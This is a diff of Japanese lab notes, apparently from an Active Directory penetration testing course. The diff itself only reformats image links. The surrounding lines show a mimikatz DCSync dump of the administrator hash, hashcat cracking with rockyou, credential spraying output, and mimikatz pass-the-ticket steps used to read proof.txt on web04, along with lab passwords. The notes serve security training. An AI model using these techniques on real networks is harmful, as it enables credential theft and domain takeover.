@@ -16,7 +16,7 @@ xfreerdp3 /cert:ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023
 ```mimikatz
 lsadump::dcsync /user:corp\administrator
 ```
-![](../../../assets/images/Pasted%20image%2020260502094949.png)
+![[Pasted image 20260502094949.png]]
 ## ハッシュ解析
 #Kali
 ```zsh
@@ -25,7 +25,7 @@ echo '2892d26cdf84d7a70e2eb3b9f05c425e' > hashes.dcsync3
 sudo hashcat -m 1000 hashes.dcsync3 'rockyou.txt' -r /usr/share/hashcat/rules/best64.rule --force
 ```
 2892d26cdf84d7a70e2eb3b9f05c425e:lab
-![](../../../assets/images/Pasted%20image%2020260502094944.png)
+![[Pasted image 20260502094944.png]]
 
 # VMGp3
 
@@ -46,7 +46,7 @@ SMB         192.168.158.73  445    FILES04          [+] corp.com\leon:HomeTaping
 SMB         192.168.158.75  445    CLIENT75         [+] corp.com\leon:HomeTaping199! 
 SMB         192.168.158.76  445    CLIENT76         [+] corp.com\leon:HomeTaping199!
 ```
-![](../../../assets/images/Pasted%20image%2020260502094936.png)
+![[Pasted image 20260502094936.png]]
 # VMGp4
 
 ## Pass the Ticket
@@ -56,17 +56,17 @@ SMB         192.168.158.76  445    CLIENT76         [+] corp.com\leon:HomeTaping
 ```powersehll
 mimikatz # sekurlsa::tickets /export
 ```
-![](../../../assets/images/Pasted%20image%2020260502094929.png)
+![[Pasted image 20260502094929.png]]
 ### チケットの挿入
 ```powershell
 mimikatz # kerberos::ptt [0;2ecd1e]-0-0-40810000-dave@cifs-web04.kirbi
 ```
-![](../../../assets/images/Pasted%20image%2020260502094924.png)
+![[Pasted image 20260502094924.png]]
 ### チケットの確認
 ```powershell
 klist
 ```
-![](../../../assets/images/Pasted%20image%2020260502094919.png)
+![[Pasted image 20260502094919.png]]
 
 ### アクセス
 ```powershell
@@ -74,4 +74,4 @@ ls \\web04\backup
 
 type \\web04\backup\proof.txt
 ```
-![](../../../assets/images/Pasted%20image%2020260502094915.png)
+![[Pasted image 20260502094915.png]]
